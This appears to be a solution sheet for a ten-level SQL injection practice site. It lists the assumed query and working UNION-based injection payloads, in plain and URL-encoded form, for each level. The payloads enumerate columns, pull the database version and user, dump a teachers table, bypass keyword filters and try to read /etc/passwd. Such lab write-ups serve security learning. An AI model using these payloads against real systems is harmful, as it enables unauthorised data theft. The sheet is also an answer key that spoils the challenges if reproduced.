**LEVEL 1**

- Full request:

```
SELECT * FROM some_table WHERE some_field = [USER INPUT];
```

- Injections:

```
1 UNION SELECT 1, 2
1%20UNION%20SELECT%201,%202

1 UNION SELECT 1, 2, 3
1%20UNION%20SELECT%201,%202,%203

-1 UNION SELECT VERSION(), USER(), 3
-1%20UNION%20SELECT%20VERSION(),%20USER(),%203
```

**LEVEL 2**

- Full request:

```
SELECT * FROM some_table WHERE some_field = '[USER INPUT]';
```

- Injections:

```
"4'--%20"

"4--%20"

"4' UNION SELECT 1, 2, 3 -- "
4'%20UNION%20SELECT%201,%202,%203%20--%20

"4' UNION SELECT 1, 2, 3, 4 -- "
4'%20UNION%20SELECT%201,%202,%203,%204%20--%20

"-1' UNION SELECT VERSION(), USER(), 3, 4 -- "
-1'%20UNION%20SELECT%20VERSION(),%20USER(),%203,%204%20--%20
```

**LEVEL 3**

- Full request:

```
SELECT * FROM some_table WHERE some_field = 'INPUT';
```

- Injections:

```
"3' UNION SELECT 1 -- "
3'%20UNION%20SELECT%201%20--%20

"3' UNION SELECT 1, 2, 3, 4 -- "
3'%20UNION%20SELECT%201,%202,%203,%204%20--%20

"-1' UNIONON SELECT VERSION(), USER(),  3, 4 -- "
-1'%20UNIONON%20SELECT%20VERSION(),%20USER(),%203,%204%20--%20
```

**Level 4**

- Full request:

```
SELECT * FROM some_table WHERE some_field = 'INPUT';
```

- Injections:

```
"6' UNION SELECT VERSION(), USER(), 3, 4, 5 -- "
6'%20UNION%20SELECT%20VERSION(),%20USER(),%203,%204,%205%20--%20
```

**Level 5**

```
https://www.zixem.altervista.org/SQLi/md5cracker.php?hash=d1fd6ef9af6cb677e09b1b0a68301e0c

https://www.zixem.altervista.org/SQLi/login_do.php?pass=zixemhf
```

**Level 6**

- Full request:

```
SELECT * FROM some_table WHERE some_field = INPUT;
```

- Injections:

```
-1 UNION SELECT 1, 2, 3, 4
-1%20UNION%20SELECT%201,%202,%203,%204

-1 UNION SELECT 1, 2, 3, 4 FROM teachers
-1%20UNION%20SELECT%201,%202,%203,%204%20FROM%20teachers

-1 UNION SELECT id, 2, 3, 4 FROM teachers WHERE id = 11
-1%20UNION%20SELECT%20id,%202,%203,%204%20FROM%20teachers%20WHERE%20id%20=%2011

-1 UNION SELECT id, teacher, teacher_age, price FROM teachers WHERE id = 11
-1%20UNION%20SELECT%20id,%20teacher,%20teacher_age,%20price%20FROM%20teachers%20WHERE%20id%20=%2011
```

**Level 7**

- Full request:

```
SELECT * FROM some_table WHERE some_field = INPUT;
```

- Injections:

```
1'--%20

1 UNION SELECT 1, 2
1%20UNION%20SELECT%201,%202

1 UNION SELECT 1, 2, 3
1%20UNION%20SELECT%201,%202,%203

-1 UNION SELECT 1, version(), 3
-1%20UNION%20SELECT%201,%20version(),%203

-1 UNION SELECT 1, user(), 3
-1%20UNION%20SELECT%201,%20user(),%203
```

**Level 8**

- Full request:

```
SELECT * FROM some_table WHERE some_field = INPUT;
```

- Injections:

```
-1 UNION SESELECTLECT VERSION(),USER(),3
-1%20UNION%20SESELECTLECT%20VERSION(),USER(),3

-1%0bUNION%0bSESELECTLECT%0bVERSION(),USER(),3
```

**Level 9**

- Full request:

```
SELECT * FROM some_table WHERE some_field = 'INPUT';
```

- Injections:

```
"1' UNION SELECT 1, 2 -- "
1'%20UNION%20SELECT%201,%202%20--%20

"-1' UNION SELECT '/etc/passwd',2 -- "
-1'%20UNION%20SELECT%20'/etc/passwd',2%20--%20

"-1' UNION SELECT '../etc/passwd',2 -- "
-1'%20UNION%20SELECT%20'../etc/passwd',2%20--%20
```

**Level 10**

- Full request:

```
SELECT * FROM some_table WHERE some_field = INPUT;
```

- Injections:

```
2 UNION SELECT 1, user()

2 UNION SELECT 1, version()
```